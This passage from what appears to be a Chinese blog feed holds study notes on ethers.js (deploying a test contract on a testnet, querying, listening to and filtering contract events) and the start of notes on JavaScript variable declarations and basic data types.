class="hljs-comment">// 部署合约 Test，构造函数设置 password = 2，并转入1 wei </span><br>    <span class="hljs-keyword">const</span> abiTest = [<br>        <span class="hljs-string">&quot;constructor(uint8 pw) payable&quot;</span>,<br>        <span class="hljs-string">&quot;function YouCanUseIt() public returns(uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;function transfer(address payable to, uint256 amount) public payable&quot;</span>,<br>        <span class="hljs-string">&quot;function getBalance() public view returns(uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;function password() external view returns(uint8)&quot;</span>,<br>        <span class="hljs-string">&quot;function number() external view returns(uint8)&quot;</span>,<br>        <span class="hljs-string">&quot;event getReturn(uint256 indexed num)&quot;</span>,<br>        <span class="hljs-string">&quot;event txReceive(string)&quot;</span>,<br>    ]<br>    <span class="hljs-keyword">const</span> bytecodeTest = <span class="hljs-string">&quot;略&quot;</span>;<br>    <span class="hljs-keyword">const</span> contractFactoryTest = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">ContractFactory</span>(abiTest, bytecodeTest, myWallet);<br>    <span class="hljs-keyword">const</span> contractTest = <span class="hljs-keyword">await</span> contractFactoryTest.<span class="hljs-title function_">deploy</span>(<span class="hljs-number">22</span>, &#123;<span class="hljs-attr">value</span>:<span class="hljs-number">1</span>&#125;);<br>    <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">waitForDeployment</span>();<br>    <span class="hljs-comment">// 获取合约地址</span><br>    <span class="hljs-keyword">const</span> addressTest = contractTest.<span class="hljs-property">target</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`合约地址: <span class="hljs-subst">$&#123;addressTest&#125;</span>`</span>);<br>    <span class="hljs-comment">// 获取余额</span><br>    <span class="hljs-keyword">const</span> balance = <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">getBalance</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(balance);<br>&#125;<br><br><span class="hljs-title function_">contractDeploy</span>();<br></code></pre></td></tr></table></figure><h1 id="6-事件的检索、监听和过滤"><a href="#6-事件的检索、监听和过滤" class="headerlink" title="6. 事件的检索、监听和过滤"></a>6. 事件的检索、监听和过滤</h1><h2 id="1-事件检索"><a href="#1-事件检索" class="headerlink" title="1. 事件检索"></a>1. 事件检索</h2><p>使用合约类中的<code>queryFilter()</code> 函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> getEvents = <span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">queryFilter</span>(<span class="hljs-string">&#x27;事件名&#x27;</span>, 起始区块, 结束区块)<br></code></pre></td></tr></table></figure><p>要检索的事件需包含在自己写的合约 abi 中。</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>还是上面的 <code>Test</code> 合约，调用一次 <code>YouCanUseIt</code> 函数，通过事件 <code>getReturn</code> 获取 number 的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">events</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> abiTest = [<br>        <span class="hljs-string">&quot;constructor(uint8 pw) payable&quot;</span>,<br>        <span class="hljs-string">&quot;function YouCanUseIt() public returns(uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;function transfer(address payable to, uint256 amount) public payable&quot;</span>,<br>        <span class="hljs-string">&quot;function getBalance() public view returns(uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;function password() external view returns(uint8)&quot;</span>,<br>        <span class="hljs-string">&quot;function number() external view returns(uint8)&quot;</span>,<br>        <span class="hljs-string">&quot;event getReturn(uint256 indexed num)&quot;</span>,<br>        <span class="hljs-string">&quot;event txReceive(string)&quot;</span>,<br>    ]<br>    <span class="hljs-keyword">const</span> bytecodeTest = <span class="hljs-string">&quot;略&quot;</span>;<br>    <span class="hljs-keyword">const</span> contractFactoryTest = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">ContractFactory</span>(abiTest, bytecodeTest, myWallet);<br>    <span class="hljs-keyword">const</span> contractTest = <span class="hljs-keyword">await</span> contractFactoryTest.<span class="hljs-title function_">deploy</span>(<span class="hljs-number">22</span>, &#123;<span class="hljs-attr">value</span>:<span class="hljs-number">1</span>&#125;);<br>    <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">waitForDeployment</span>();<br>    <br>    <span class="hljs-keyword">const</span> addressTest = contractTest.<span class="hljs-property">target</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`合约地址: <span class="hljs-subst">$&#123;addressTest&#125;</span>`</span>);<br>    <br>    <span class="hljs-keyword">const</span> balance = <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">getBalance</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`合约余额: <span class="hljs-subst">$&#123;balance&#125;</span>`</span>);<br><br>    <span class="hljs-title function_">await</span> (<span class="hljs-keyword">await</span> contractTest.<span class="hljs-title class_">YouCanUseIt</span>()).<span class="hljs-title function_">wait</span>();<br>    <span class="hljs-keyword">const</span> currentHeight = <span class="hljs-keyword">await</span> providerSepolia.<span class="hljs-title function_">getBlockNumber</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`当前高度: <span class="hljs-subst">$&#123;currentHeight&#125;</span>`</span>);<br>    <span class="hljs-keyword">const</span> event_getReturn = <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">queryFilter</span>(<span class="hljs-string">&#x27;getReturn&#x27;</span>, currentHeight-<span class="hljs-number">100</span>, currentHeight);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event_getReturn[<span class="hljs-number">0</span>]);<br>&#125;<br><br><span class="hljs-title function_">events</span>()<br></code></pre></td></tr></table></figure><p>得到结果，<code>topics</code> 第二个参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs eventLog">topics: [<br>&#x27;0x89add6c0d02657f10a2ccdbd6a2b4696a2e4a204ed5b7753ef58c26a16927fbb&#x27;,<br>    &#x27;0x0000000000000000000000000000000000000000000000000000000000000002&#x27;<br>],<br></code></pre></td></tr></table></figure><h2 id="2-事件监听"><a href="#2-事件监听" class="headerlink" title="2. 事件监听"></a>2. 事件监听</h2><p>当我们想持续获取一个事件的实时调用情况时，检索就不太行。</p><p>我们使用 <code>contract.on()</code> 持续监听，使用 <code>contract.once()</code> 监听一次。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">contract.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;事件名&quot;</span>, 监听到事件触发时调用的函数);<br>contract.<span class="hljs-title function_">once</span>(<span class="hljs-string">&quot;事件名&quot;</span>, 监听到事件触发时调用的函数);<br></code></pre></td></tr></table></figure><h3 id="例-1"><a href="#例-1" class="headerlink" title="例"></a>例</h3><p>还是 <code>Test</code> 合约，我们手动在 Remix 上调用函数 <code>YouCanUseIt</code>，持续监听它的 <code>getReturn</code> 事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">events</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> abiTest = [<br>        <span class="hljs-string">&quot;constructor(uint8 pw) payable&quot;</span>,<br>        <span class="hljs-string">&quot;function YouCanUseIt() public returns(uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;function transfer(address payable to, uint256 amount) public payable&quot;</span>,<br>        <span class="hljs-string">&quot;function getBalance() public view returns(uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;function password() external view returns(uint8)&quot;</span>,<br>        <span class="hljs-string">&quot;function number() external view returns(uint8)&quot;</span>,<br>        <span class="hljs-string">&quot;event getReturn(uint256 indexed num)&quot;</span>,<br>        <span class="hljs-string">&quot;event txReceive(string)&quot;</span>,<br>    ]<br>    <span class="hljs-keyword">const</span> bytecodeTest = <span class="hljs-string">&quot;略&quot;</span>;<br>    <span class="hljs-keyword">const</span> contractFactoryTest = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">ContractFactory</span>(abiTest, bytecodeTest, myWallet);<br>    <span class="hljs-keyword">const</span> contractTest = <span class="hljs-keyword">await</span> contractFactoryTest.<span class="hljs-title function_">deploy</span>(<span class="hljs-number">22</span>, &#123;<span class="hljs-attr">value</span>:<span class="hljs-number">1</span>&#125;);<br>    <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">waitForDeployment</span>();<br>    <br>    <span class="hljs-keyword">const</span> addressTest = contractTest.<span class="hljs-property">target</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`合约地址: <span class="hljs-subst">$&#123;addressTest&#125;</span>`</span>);<br>    <br>    contractTest.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;getReturn&quot;</span>, <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`当前 num 的值: <span class="hljs-subst">$&#123;num&#125;</span>`</span>);<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-事件过滤"><a href="#3-事件过滤" class="headerlink" title="3. 事件过滤"></a>3. 事件过滤</h2><p>通过 <code>contract.filters.事件名</code> ，根据事件的 <code>topic</code>（也就是 <code>indexed</code> 的那个参数），对事件进行筛选。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> filter = contract.<span class="hljs-property">filters</span>.<span class="hljs-title function_">EVENT_NAME</span>( ...args ) <br></code></pre></td></tr></table></figure><p><code>...args</code> 是该方法的参数，一般是 <code>null</code>，对某一参数的筛选条件，或数组。由于第0个 <code>topic</code> 是时间的哈希，筛选从第1个 <code>topic</code> 开始。</p><ul><li><code>null</code> 表示不对该条件进行筛选。</li><li>数组，当事件当前位置参数的值与数组中任意一个元素匹配时，通过筛选。</li></ul><p>我们改写一下 <code>Test</code> 合约中的 <code>getReturn</code> 事件：<code>event getReturn(uint256 indexed num, bool indexed isOdd);</code></p><p>它有如下3个 <code>topic</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs topics">topic 0: 事件哈希<br>topic 1: num// 当前 num 的值<br>topic 2: isOdd// num 是否为奇数<br></code></pre></td></tr></table></figure><p>那么针对该事件的过滤器的两个参数就分别针对 topic1 和 topic2。</p><p>如：</p><ol><li><p><code>num</code> 任意，<code>isOdd</code> 为 <code>true</code> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> filter_getReturn = contractTest.<span class="hljs-property">filters</span>.<span class="hljs-title function_">getReturn</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure></li><li><p><code>num</code> 为 1或2，<code>isOdd</code> 任意</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> filter_getReturn = contractTest.<span class="hljs-property">filters</span>.<span class="hljs-title function_">getReturn</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]) <br></code></pre></td></tr></table></figure><p>位于后面的，不指明的，默认为任意，不用单独写 <code>null</code>。</p></li></ol><p>完整来看，就是 WTF 上的那张图片，左列是该函数的参数，右列为参数对应的筛选条件。（只不过是直接从 <code>topic[1]</code> 开始，没有对 <code>topic[0]</code> 的筛选）</p><p><img src="https://www.wtf.academy/assets/images/9-1-4273780b5cd8a46c30cc3fa2b0d174d5.png" alt="6.3.0"></p><h3 id="例-2"><a href="#例-2" class="headerlink" title="例"></a>例</h3><p>当 <code>num</code> 是奇数时，输出该事件的两个参数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">events</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> abiTest = [<br>        <span class="hljs-string">&quot;constructor(uint8 pw) payable&quot;</span>,<br>        <span class="hljs-string">&quot;function YouCanUseIt() public returns(uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;event getReturn(uint256 indexed num, bool indexed isOdd)&quot;</span>,<br>    ]<br>    <span class="hljs-keyword">const</span> bytecodeTest = <span class="hljs-string">&quot;略&quot;</span>;<br>    <span class="hljs-keyword">const</span> contractFactoryTest = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">ContractFactory</span>(abiTest, bytecodeTest, myWallet);<br>    <span class="hljs-keyword">const</span> contractTest = <span class="hljs-keyword">await</span> contractFactoryTest.<span class="hljs-title function_">deploy</span>(<span class="hljs-number">22</span>);<br>    <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">waitForDeployment</span>();<br>    <br>    <span class="hljs-keyword">const</span> addressTest = contractTest.<span class="hljs-property">target</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`合约地址: <span class="hljs-subst">$&#123;addressTest&#125;</span>`</span>);<br><br>    <span class="hljs-keyword">const</span> filter_onlyOdd = contractTest.<span class="hljs-property">filters</span>.<span class="hljs-title function_">getReturn</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);<br>    <br>    contractTest.<span class="hljs-title function_">on</span>(filter_onlyOdd, <span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`当前 num 的值: <span class="hljs-subst">$&#123;res.args[<span class="hljs-number">0</span>]&#125;</span>, isOdd = <span class="hljs-subst">$&#123;res.args[<span class="hljs-number">1</span>]&#125;</span>`</span>);<br>    &#125;)<br><br></code></pre></td></tr></table></figure></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>javaScript笔记</title>
    <link href="/2024/12/22/javaScript%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/12/22/javaScript%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>为 <code>ethers.js</code> 的 <code>JavaScript</code> 入门，主要参考：</p><ul><li><a href="https://www.wtf.academy/docs/javascript-101/">WTF Academy</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">JavaScript | MDN</a></li><li><a href="https://www.bilibili.com/video/BV18a4y1L7kD/?p=48&amp;share_source=copy_web&amp;vd_source=30458d0272bcd4393973b9abe093fff8">微软官方 JavaScript 入门教程</a></li><li><a href="https://www.bilibili.com/video/BV1b14y1w7Mg/?share_source=copy_web&amp;vd_source=30458d0272bcd4393973b9abe093fff8">JS 异步编程</a></li></ul><h1 id="1-变量声明方式"><a href="#1-变量声明方式" class="headerlink" title="1. 变量声明方式"></a>1. 变量声明方式</h1><p>主要有三种：<code>var</code>，<code>let</code> 和 <code>const</code>。其中 <code>var</code> 不推荐使用。</p><h2 id="1-var"><a href="#1-var" class="headerlink" title="1. var"></a>1. <code>var</code></h2><p>在函数中，作用域为整个函数；函数外则为全局。</p><p>不推荐使用，因为会造成全局对象的污染。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Test</span> (<span class="hljs-params"></span>){<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) {<br>        <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"In if, a = %d"</span>, a);<br>    }<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"a = %d"</span>, a);<br>}<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"%d"</span>, a);<br><span class="hljs-keyword">var</span> a = <span class="hljs-number">100</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"%d"</span>, a);<br><span class="hljs-title class_">Test</span>();<br><span class="hljs-comment">/*输出为：</span><br><span class="hljs-comment">NaN</span><br><span class="hljs-comment">100</span><br><span class="hljs-comment">In if, a = 1</span><br><span class="hljs-comment">a = 1</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>第一处输出为 <code>NaN</code>，也表明了此时变量 <code>a</code> 已存在（只是未赋值），表明了 <code>var</code> 的作用域为全局作用域（<code>function</code> 外的所有地方）。</p><h2 id="2-let"><a href="#2-let" class="headerlink" title="2. let"></a>2. <code>let</code></h2><p>作用域为块级（也就是一对 <code>{}</code> 的范围内）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Test</span> (<span class="hljs-params"></span>){<br>    <span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) {<br>        <span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"In if, a = %d"</span>, a);<br>    }<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"a = %d"</span>, a);<br>}<br><br><span class="hljs-keyword">let</span> a = <span class="hljs-number">100</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"%d"</span>, a);<br><span class="hljs-title class_">Test</span>();<br><span class="hljs-comment">/*输出为：</span><br><span class="hljs-comment">100</span><br><span class="hljs-comment">In if, a = 1</span><br><span class="hljs-comment">a = 0</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>显然， <code>if</code> 中的变量 <code>a</code> 仅在 <code>if</code> 内生效，且对 <code>a</code> 的改变不影响外部的另一个 <code>a</code>。（但应尽量避免这种脑溢血行为）</p><h2 id="3-const"><a href="#3-const" class="headerlink" title="3. const"></a>3. <code>const</code></h2><p>与 <code>let</code> 类似，但必须在声明时赋值，且无法改变。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> a = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 这样是不对的，必须在声明时赋值</span><br><span class="hljs-keyword">const</span> b;<br>b = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// 这样也是不可以的，常量的值无法改变</span><br>a = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h1 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2. 数据类型"></a>2. 数据类型</h1><p>主要分为：</p><ol><li>值类型（7个基本类型）：<code>Number</code>，<code>BigInt</code>（任意大整数），<code>String</code>，<code>Boolean</code>，<code>Null</code>（空，故意的空值），<code>Undefined</code>（未定义，暂未赋值），<code>Symbol</code>。</li><li>引用数据类型（对象类型）：<code>Array</code>，<code>Function</code>，<code>Object</code>，<code>Date</code>，<code>RegExp</code>（正则）等。</li></ol><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><h3 id="1-Number"><a href="#1-Number" class="headerlink" title="1. Number"></a>1. <code>Number</code></h3><p>整数或双精度浮点数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">let</span> b = <span class="hljs-number">1.23</span>;<br><span class="hljs-keyword">let</span> c = <span class="hljs-number">1e5</span>;<br></code></pre></td></tr></table></figure><h4 id="NaN，Infinity-和-Infinity"><a href="#NaN，Infinity-和-Infinity" class="headerlink" title="NaN，Infinity 和 -Infinity"></a><code>NaN</code>，<code>Infinity</code> 和 <code>-Infinity</code></h4><p>三个特殊的值。</p><ol><li><p><code>NaN</code>（Not A Number）：当运算结果不能表示为数字时出现。如：<code>let d = 0 / 0;</code> 结果就是 <code>NaN</code>。</p></li><li><p><code>Infinity</code>：正无穷。大于 <code>Number.MAX_VALUE</code>（<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="8.416ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 3719.7 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(1000,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(2219.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(3219.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>）的值将被记为 <code>Infinity</code>。</p><p>如下两种情况结果均为 <code>Infinity</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> e = <span class="hljs-number">1</span> / <span class="hljs-number">0</span>;<br><span class="hljs-keyword">let</span> f = <span class="hljs-number">2e1024</span>;<br></code></pre></td></tr></table></figure></li><li><p><code>-Infinity</code>：负无穷。小于 <code>-Number.MAX_VALUE</code> 的值被记为 <code>-Infinity</code>。</p><p>如下两种情况结果均为 <code>-Infinity</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> g = <span class="hljs-number">1</span> / (-<span class="hljs-number">0</span>);<br><span class="hljs-keyword">let</span> h = -(<span class="hljs-number">2e1024</span>);<br></code></pre></td></tr></table></figure></li></ol><h3 id="2-BigInt"><a href="#2-BigInt" class="headerlink" title="2. BigInt"></a>2. <code>BigInt</code></h3><p>可以表示任意大小的<strong>整数</strong>。</p><p>通过在整数末尾加 <code>n</code> 或使用 <code>BigInt()</code> 函数创建。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> i = <span class="hljs-title class_">BigInt</span>(<span class="hljs-title class_">Number</span>.<span class="hljs-property">MAX_VALUE</span>);<br><span class="hljs-keyword">let</span> j = i + <span class="hljs-number">1n</span>;<br></code></pre></td></tr></table></figure><h3 id="3-String"><a href="#3-String" class="headerlink" title="3. String"></a>3. <code>String</code></h3><h4 id="字符串的创建"><a href="#字符串的创建" class="headerlink" title="字符串的创建"></a>字符串的创建</h4><p>使用 <code>''</code> 或 <code>""</code> 创建。一但创建就不可修改。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> k = <span class="hljs-string">"Hello?"</span>;<span class="hljs-comment">// 一般使用 const 创建</span><br>k[<span class="hljs-number">2</span>] = <span class="hljs-string">'L'</span>;<span class="hljs-comment">// 这步无法执行</span><br></code></pre></td></tr></table></figure><h4 id="字符串的访问"><a href="#字符串的访问" class="headerlink" title="字符串的访问"></a>字符串的访问</h4><p>可以使用 <code>[]</code> 或 <code>charAt()</code> 来访问字符串中的某个字符。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> l = k[<span class="hljs-number">2</span>];<br><span class="hljs-keyword">const</span> m = k.<span 